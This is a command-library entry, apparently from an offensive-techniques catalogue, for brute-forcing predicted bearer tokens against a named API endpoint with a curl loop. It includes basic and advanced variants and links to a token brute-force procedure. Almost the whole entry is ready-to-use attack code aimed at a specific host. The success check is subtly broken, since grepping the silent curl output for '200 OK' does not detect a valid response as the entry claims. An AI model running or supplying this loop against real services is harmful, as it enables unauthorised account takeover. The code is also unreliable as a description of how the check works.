---
id: cmd-test-token-with-curl
data: >-
  while read token; do curl -s -H "Authorization: Bearer $token"
  https://joola.io/api/session | grep -q '200 OK' && echo "Valid token: $token"
  && break; done < predicted_tokens.txt
tags:
  - brute-force
  - auth-test
type: command
output: 'Valid token: [matching_token] (if found)'
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:10.743Z'
verified: false
validated: true
submitted: true
---
# test-token-with-curl

## Command

```bash
while read token; do
  curl -s -H "Authorization: Bearer $token" https://joola.io/api/session | grep -q '200 OK' && echo "Valid token: $token" && break;
done < predicted_tokens.txt
```

## Description

This bash loop tests predicted tokens from a file against an API endpoint using curl, stopping on the first successful auth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer $token"` | Sets the token header | Yes |
| `https://joola.io/api/session` | Target endpoint | Yes |
| `grep -q '200 OK'` | Checks for success | Yes |

## Examples

### Basic Usage

```bash
while read token; do curl -s -H "Authorization: Bearer $token" https://joola.io/api/session | grep -q '200 OK' && echo "Valid: $token"; done < tokens.txt
```

### Advanced Usage

```bash
while read token; do response=$(curl -s -w "%{http_code}" -H "Authorization: Bearer $token" https://joola.io/api/session); if [[ $response == *"200"* ]]; then echo "Valid: $token"; break; fi; done < tokens.txt
```

## Expected Output

If successful: 'Valid token: [token_value]'. Otherwise, loops through all without output.

## Related

- [[Related Procedure: Brute-Force-Predictable-Auth-Tokens]]
